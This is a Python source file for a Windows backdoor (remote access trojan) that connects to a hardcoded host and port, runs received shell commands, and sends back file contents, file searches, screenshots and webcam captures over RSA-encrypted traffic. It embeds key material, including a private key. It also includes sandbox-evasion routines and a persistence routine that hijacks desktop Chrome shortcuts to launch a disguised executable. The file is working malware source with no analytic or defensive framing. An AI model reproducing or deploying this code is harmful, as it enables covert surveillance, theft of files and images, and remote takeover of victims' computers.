import socket,subprocess,os,time,tempfile,multiprocessing,sys,random,cv2
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from mss import mss
from pynput.mouse import Listener
import pythoncom
from win32com.shell import shell, shellcon

MAX = 1024

class Backdoor:

    def __init__(self, IP, PORT):
        self.publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAtUSk1HaWYzFhlhYauflJ
50mCMBulIe9EZPH4Qd4hOyqJ8yuITs9okbAA6MVjC5qw0mUjlAY2SB/kgVPoVM23
fhh8do/AmOVZvCDiz9glUw5zGaiyycOckSnJm+vPAOP7ODdbDlQN6QSpaoUH8hB8
65WgJljS99OcRaAs+pqv6l8QifQDSUdHUFQDM0Eerpf8jwvhiy6SAJV5rOnP5A1t
Ha15GfOl0y3B23DF3/9aCRfVOHRFbIMjchuxRm/Jb7siDWRudzL8qf0mI2PtuHr/
cY+AcAyVXxc2xuMKk+tqYwHFVA4t5zKBzYLLcaP8xsrOGWe299LokU/07ACrU8Mt
zvxlHVjtdkPJVTmBT/1yQNo08URfdE8zUuQnkrO2VCpXSevFz7vzh0ob2ZAt61X2
u2FQVJbGQf1orvjyJ4EFZ1Hnaz8xtYIaHzOon+jm46Evo6Q2OHq58EHOUdC3DzuO
smNzsAlySPyXh+rYSwOZbmSgk/SmlRLdilpdwP8axE6RCjosw3fH6X5OrT41DmvC
Hs22ZMV2YrG4EjifPsnitQNwXjGsMmAyHQ/ETXP66r2fIBEpi6p0KOeTEAfmhJPk
zXRJEBS3hcrnWyABQHne2kEbvJH5z9FquwMMtNQbG1cCuo0XKIScXNYHwJgKakaj
slEMB/KNymbafbHPnUDCpp8CAwEAAQ==
-----END PUBLIC KEY-----'''
        self.privatekey = '''-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----'''
        self.IP = IP
        self.PORT = PORT
        self.clicks = 0
        self.max_clicks = random.randint(5,15)
        self.max_move = random.randint(5000,15000)
        self.move = 0

    def on_move(self,x, y):
        self.move += 1

    def onclick(self, x, y, button, pressed):
        if pressed:
            self.clicks += 1
            if self.clicks == self.max_clicks and self.move > self.max_move :
                self.listener.stop()

    def evade(self):
        if multiprocessing.cpu_count() < 4:
            exit()
        with Listener(on_click=self.onclick,on_move=self.on_move) as self.listener:
            self.listener.join() 

    def encrypt(self, msg):
        public_key = RSA.importKey(self.publickey)
        encryptor = PKCS1_OAEP.new(public_key)
        encryptedData = encryptor.encrypt(msg)
        return encryptedData

    def decrypt(self, cipher):
        private_key = RSA.importKey(self.privatekey)
        decryptor = PKCS1_OAEP.new(private_key)
        dec = decryptor.decrypt(cipher)
        return dec.decode()
        
    def connect(self, IP, PORT):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((IP,PORT))
            self.r_send(self.exec_cmd("whoami"))
        except:
            time.sleep(2)
            self.connect(self.IP, self.PORT)
      
    def exec_cmd(self, cmd):
        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
        stdout = res.stdout.read().decode().strip()
        stderr = res.stderr.read().decode().strip()
        if stdout:
            return (stdout)
        elif stderr:
            return (stderr)
        else:
            return ''
    
    def r_send(self, msg):
        msg = msg.encode()
        encrypted = "".encode()
        if(len(msg)>470):
            for i in range(0,len(msg),470):
                chunk = msg[0+i:470+i]
                encrypted += self.encrypt(chunk)
        else:
            encrypted = self.encrypt(msg)
        encrypted += "done".encode()
        self.connection.send(encrypted)

    def r_recv(self):
        data = "".encode()
        while not data.endswith("done".encode()):
            data += self.connection.recv(MAX)
        data = data[:-4]
        decrypted = ""
        if len(data)>512:
            for i in range(0,len(data),512):
                chunk = data[i+0:i+512]
                decrypted += self.decrypt(chunk)
        else:
            decrypted = self.decrypt(data)
        return decrypted
    
    def change_dir(self,dirr):
        try:
            os.chdir(dirr)
            self.r_send(self.exec_cmd("cd"))
        except AttributeError:
            self.r_send(self.exec_cmd("pwd"))
        except Exception as e:
            self.r_send(str(e))
        
    def upload(self,filename):
        if os.path.exists(filename):
            f = open(filename,'rb')
            packet = f.read(MAX)
            while(len(packet)>0):
                self.connection.send(packet)
                packet = f.read(MAX)
            self.connection.send("done".encode())
        else:
            self.connection.send("[-] File not found".encode())

    def download(self, filename):
        f = open(filename,"wb")
        while(True):
            packet = self.connection.recv(MAX)
            if "[-] File not found".encode() in packet:
                f.close()
                os.remove(filename)
                break
            elif packet.endswith("done".encode()):
                f.write(packet[:-4])
                f.close()
                break
            f.write(packet)

    def search(self, ext):
        home = os.path.expanduser("~")
        res = ""
        for root, dirr , files in os.walk(home):
            for file in files:
                if file.endswith(ext):
                    res += os.path.join(root, file) + '\n'
        self.r_send(res)

    def shortcut_path (self, shortcutfile):
        link = pythoncom.CoCreateInstance (shell.CLSID_ShellLink,None,pythoncom.CLSCTX_INPROC_SERVER,shell.IID_IShellLink)
        link.QueryInterface (pythoncom.IID_IPersistFile).Load (shortcutfile)
        target_path, _ = link.GetPath (shell.SLGP_UNCPRIORITY)
        return target_path

    def modify_shortcut(self, filename,dest,appdata):
        shortcut = pythoncom.CoCreateInstance (
            shell.CLSID_ShellLink,
            None,
            pythoncom.CLSCTX_INPROC_SERVER,
            shell.IID_IShellLink
        )
        desktop_path = shell.SHGetFolderPath (0, shellcon.CSIDL_DESKTOP, 0, 0)
        shortcut_path = os.path.join (desktop_path, filename)
        persist_file = shortcut.QueryInterface (pythoncom.IID_IPersistFile)
        persist_file.Load (shortcut_path)
        shortcut.SetPath(dest)
        shortcut.SetWorkingDirectory (appdata)
        persist_file.Save (shortcut_path, 0)

    def persistence(self):
        appdata = os.environ['appdata']
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        location = os.environ['appdata'] + "\\chrome_x64.exe"
        if not os.path.exists(os.path.join(appdata,"chromelog.txt")):
            os.chdir(desktop)
            for f in os.listdir(desktop):
                if "chrome" in f.lower():
                    tar_path = self.shortcut_path(f)
                    os.chdir(appdata)
                    with open("chromelog.txt","w") as fp:
                        fp.write(tar_path)
                    self.modify_shortcut(f,location,appdata)
        os.chdir(appdata)
        with open("chromelog.txt",'r') as fp:
            l = fp.readline()
            os.startfile(l)
    
    def cam(self):
        current_dir = os.getcwd()
        os.chdir(tempfile.gettempdir())
        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        return_value, image = camera.read()
        cv2.imwrite("image.png", image)
        self.upload("image.png")
        os.remove("image.png")
        os.chdir(current_dir)

    def screenshot(self):
        current_dir = os.getcwd()
        os.chdir(tempfile.gettempdir())
        with mss() as sct:
            sct.shot()
        self.upload("monitor-1.png")
        os.remove("monitor-1.png")
        os.chdir(current_dir)
        
    def run(self):
        self.connect(self.IP, self.PORT)
        while(True):
            try:
                cmd = self.r_recv()
                cmd = cmd.split(' ')
                if cmd[0] == "cd" and len(cmd)>1:
                    self.change_dir(cmd[1])
                elif cmd[0] == "download":
                    filename = filename = ' '.join(cmd[1:])
                    self.upload(filename)
                elif cmd[0] == "upload":    
                    filename = filename = ' '.join(cmd[1:])
                    self.download(filename)
                elif cmd[0] == "terminate":
                    self.connect(self.IP, self.PORT)
                elif cmd[0] == "clear":
                    self.run()
                elif cmd[0] == "search" and len(cmd)>1:
                    self.search(cmd[1])
                elif cmd[0] == "capture":
                    self.screenshot()
                elif cmd[0] == "cam":
                    self.cam()
                elif len(cmd)>0:
                    cmd = ' '.join(cmd)
                    result = self.exec_cmd(cmd)
                    self.r_send(result)
            except:
                self.connect(self.IP, self.PORT)



backdoor = Backdoor("192.168.1.99",2000)
#backdoor.persistence()
#backdoor.evade()
backdoor.run()